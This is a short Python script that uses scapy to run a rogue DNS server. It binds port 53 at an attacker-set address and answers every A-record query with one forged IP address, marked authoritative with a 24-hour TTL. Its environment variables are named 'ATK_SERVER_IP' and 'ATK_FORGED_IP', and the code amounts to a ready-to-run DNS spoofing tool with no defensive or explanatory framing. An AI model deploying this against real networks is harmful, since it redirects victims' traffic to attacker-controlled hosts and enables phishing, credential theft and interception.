import os
from socket import AF_INET, SOCK_DGRAM, socket

from scapy.all import DNS, DNSQR, DNSRR, dnsqtypes

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind((os.environ['ATK_SERVER_IP'], 53))

fixed_ip = os.environ['ATK_FORGED_IP']

while True:
    # DNS server that resolves every A record to a fixed A:IPV4 response.

    request, addr = sock.recvfrom(4096)

    try:
        dns_request = DNS(request)
        assert dns_request.opcode == 0, dns_request.opcode  # QUERY
        assert dnsqtypes[dns_request[DNSQR].qtype] == 'A', dns_request[DNSQR].qtype
        assert dns_request.qr == 0, dns_request.qr

        response = DNS(
            id=dns_request.id,  # Query ID / transaction id
            qr=1,  # QR (Query / Response) 1=response
            opcode=0,  # Set by client to 0 for a standard query, 0:"QUERY",1:"IQUERY",2:"STATUS"
            aa=1,  # Set to 1 in a server response if this dns_response is Authoritative, 0 if not.
            tc=0,
            # Set to 1 in a server response if the dns_response can't fit in the 512-byte limit of a UDP packet response
            rd=0,  # RD (Recursion Desired)
            ra=0,  # RA (Recursion Available), set by server: will (1) or won't (0) support recursion
            z=0,  # This is reserved and must be zero
            rcode=0,  # Response code from the server: indicates success or failure
            # "ok", 1:"format-error", 2:"server-failure", 3:"name-error", 4:"not-implemented", 5:"refused"
            qdcount=1,  # Question record count
            ancount=1,  # Answer count
            nscount=dns_request.nscount,  # authority count
            arcount=dns_request.arcount,  # additional record count
            ad=dns_request.ad,  # DNS Question/Answer data referenced by the count fields above
            cd=dns_request.cd,  # Checking Disabled (0/1)
            # DNS Question Record(s)
            qd=DNSQR(qname=dns_request[DNSQR].qname, qtype='A', qclass='IN'),
            # DNS Resource Record(s)
            an=DNSRR(rrname=dns_request[DNSQR].qname, type='A', rclass='IN', rdata=fixed_ip, ttl=86400),
            ns=dns_request.ns,
            ar=dns_request.ar
        )

        sock.sendto(bytes(response), addr)

    except:
        pass
